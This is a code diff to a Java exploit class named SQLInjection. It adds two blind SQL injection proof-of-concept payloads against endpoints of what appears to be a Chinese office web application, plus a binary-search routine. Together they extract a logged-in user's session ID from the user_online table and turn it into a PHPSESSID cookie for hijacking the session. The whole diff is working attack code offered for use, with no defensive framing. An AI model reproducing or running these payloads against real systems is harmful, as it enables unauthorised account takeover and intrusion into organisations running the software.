@@ -13,7 +13,11 @@ public class SQLInjection {
             return poc1(url);
         } else if (poc.equals("poc2")) {
             return poc2(url);
-        } else {
+        } else if (poc.equals("poc3")){
+            return poc3(url);
+        } else if (poc.equals("poc4")){
+            return poc4(url);
+        }else {
             System.out.println("未知的POC编号");
             return null;
         }
@@ -31,6 +35,31 @@ public class SQLInjection {
     private static String poc2(String url) {
         String params = "title)values(\"'\"^exp(if((ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/1),%d,1))<<%d>>63keng0),1,710)))#=1&_SERVER=";
         String cookie = bitOperation(url + "/general/document/index.php/recv/register/insert", params);
+        if (cookie != null) {
+            cookie = "PHPSESSID=" + cookie;
+        }
+        return cookie;
+    }
+
+    private static String poc3(String url){
+        // 这个 payload 用来注入获取 sessionid
+        String params = "_GET[username]=admin' and  if(hex(substr((select SID from user_online limit 1),%d,1))>'%s',1,power(9999,99)) and '1";
+        // 这个 payload 用于检测是否存在在线用户
+        String payload = "_GET[username]=admin' and (select count(SID) from user_online limit 1) >0 and '1";
+        String cookie = dichotomy(url+"/ispirit/retrieve_pwd.php?",params, payload);
+        if (cookie != null) {
+            cookie = "PHPSESSID=" + cookie;
+        }
+        return cookie;
+    }
+
+    private static String poc4(String url){
+        // 这个 payload 用来注入获取 sessionid
+        String payload = "APP_UNIT=%2527 and if((select count(SID) from user_online limit 1)>0%252C1%252Cpower(9999%252C99)) and %25271";
+        // 这个 payload 用于检测是否存在在线用户
+        String params = "APP_UNIT=keng2527 and if(hex(substr((select SID from user_online limit 1)keng252c%dkeng252c1))>keng2527%skeng2527keng252c1keng252cpower(9999keng252c99)) and keng2527";
+
+        String cookie = dichotomy(url+"/interface/go.php?", params, payload);
         if (cookie != null) {
             cookie = "PHPSESSID=" + cookie;
         }
@@ -76,5 +105,43 @@ public class SQLInjection {
         return result;
     }
 
+    private static String dichotomy(String url, String params,String payload){
+        String result = "";
+
+        // 先检测是否存在在线用户
+        Response  response = Request.get(url + payload);
+        String RespText = response.getText();
+        if (!RespText.contains("互联互通访问接口的用户名或密码有误") && !RespText.contains("电子邮件外发默认邮箱")){
+            System.out.println("SESSION获取失败,该系统当前无已登录成功的账户...");
+            return null;
+        }
+
+
+        // 确认存在登录的用户则使用二分法进行注入
+        for (int len = 1; len <= 26; len++) {
+            int min = 44;
+            int max = 122;
+            int mid;
+            while (true){
+                mid = (max + min)/2;
+                if (mid==min){break;}
+                payload = String.format(params, len,Integer.toHexString(mid));
+
+                //---占位符与poc4-payload中的%号冲突,暂未解决,临时处理---
+                payload = payload.replace("keng", "%");
+
+                response = Request.get(url + payload);
+                RespText = response.getText();
+                if (RespText.contains("错误，请联系管理员")){
+                    max = mid;
+                }else {
+                    min = mid;
+                }
+            }
+            result += (char) (mid+1);
+            System.out.println(result);
+        }
+        return result;
+    }
 
 }
